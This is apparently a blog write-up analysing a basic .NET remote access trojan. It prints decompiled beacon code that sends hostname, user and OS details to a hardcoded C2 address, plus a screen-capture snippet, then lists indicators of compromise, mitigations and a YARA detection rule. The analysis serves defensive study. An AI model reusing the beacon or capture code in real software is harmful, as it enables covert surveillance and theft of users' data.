---
title: "Basic RAT Analysis"
image: "/ViperScan.jpg"
date: "2024-05-15"
category: "malware"
tags: ["rat", "malware", "analysis"]
description: "Reverse engineering a basic remote access trojan (RAT)."
---

# 🐀 Analyzing a Simple RAT

In this writeup, we reverse engineer a .NET binary identified as a **Remote Access Trojan (RAT)**. The sample was found during a honeypot deployment and exhibits typical C2 (Command and Control) behavior.

<Note>This analysis was performed in an isolated virtual machine with no internet access to avoid unintended communication.</Note>

---

## 🔍 Behavioral Analysis

Upon execution, the RAT attempts to connect to a hardcoded C2 server.

```http
POST /api/command HTTP/1.1
Host: 192.168.1.66
User-Agent: RATClient/1.0
Content-Type: application/json
```
The binary sends system information on startup and waits for commands via polling.

### 📦 Static Analysis
We decompiled the .NET sample using dnSpy, revealing the following:

```csharp
public void ConnectToServer()
{
    string host = "http://192.168.1.66/api/command";
    string hostname = Environment.MachineName;
    string user = Environment.UserName;
    string os = Environment.OSVersion.ToString();

    var data = new {
        id = Guid.NewGuid().ToString(),
        hostname,
        user,
        os
    };

    string json = JsonConvert.SerializeObject(data);
    using (var client = new WebClient()) {
        client.UploadString(host, json);
    }
}
```
<Note>This function is called on startup and acts as the beacon.</Note>

### 🧠 Capabilities Observed
- Command Execution: Receives and runs shell commands.
- File Download/Upload: Accepts base64 files.
- Screenshot Capture: Captures and uploads PNG files using `Graphics.CopyFromScreen`.

```csharp
Bitmap bmp = new Bitmap(width, height);
Graphics g = Graphics.FromImage(bmp);
g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
```
- Keylogger: Hooks into user32.dll via `SetWindowsHookEx`.

### 🧪 Indicators of Compromise (IOCs)
- C2 IP: 192.168.1.66
- User-Agent: RATClient/1.0
- Registry Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\rat_client
- Dropped Files: C:\Users\<user>\AppData\Roaming\rat-client\client.exe

### 🛡️ Mitigation
- Block C2 domain/IP at the firewall.
- Monitor registry keys for persistence entries.
- Use behavior-based EDR solutions to detect screen capture and shell activity.

<Note>Persistence is achieved via registry autorun. Always monitor startup entries on endpoints.</Note>

### 🧵 YARA Rule (Simplified)
```yara
rule Basic_RAT
{
  meta:
    description = "Detects RATClient/1.0 user-agent"
    author = "GlitchViper"
  strings:
    $ua = "RATClient/1.0"
    $url = "http://192.168.1.66/api/command"
  condition:
    $ua or $url
}
```
### 🏁 Conclusion
This RAT is simple but dangerous. While it lacks advanced obfuscation, it demonstrates key features commonly found in real-world malware.

### 📡 C2 Communication
### 🔒 Persistence
### 🖼️ Screenshot Capture
### 📁 File Transfer

Always perform malware analysis in an isolated environment and document all observed IOCs.

<Note>Reverse engineering malware improves your ability to understand real-world attacker techniques. Practice with samples in a safe lab using tools like dnSpy, Ghidra, and ProcMon.</Note>